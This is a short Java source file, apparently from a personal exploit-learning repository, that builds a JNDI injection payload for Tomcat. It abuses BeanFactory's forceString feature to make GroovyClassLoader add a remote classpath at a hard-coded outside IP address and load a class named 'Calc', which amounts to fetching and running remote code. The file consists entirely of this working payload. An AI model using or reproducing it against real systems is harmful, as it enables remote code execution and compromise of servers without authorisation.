package com.xjjlearning.hack.java.highjdk.poc;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/**
 * Created by xjj on 2023/5/6.
 */
public class TomcatGroovyClassLoader implements Payload {
    @Override
    public ResourceRef getPayload() {

        // GroovyClassLoader：用 Groovy 的 GroovyClassLoader ，动态地加载一个脚本并执行它的行为。GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass")); // name=method, x属性使用eval这个setter赋值
        ref.add(new StringRefAddr("a", "http://47.95.7.37:9870/"));
        ref.add(new StringRefAddr("b", "Calc"));
        return ref;
    }
}
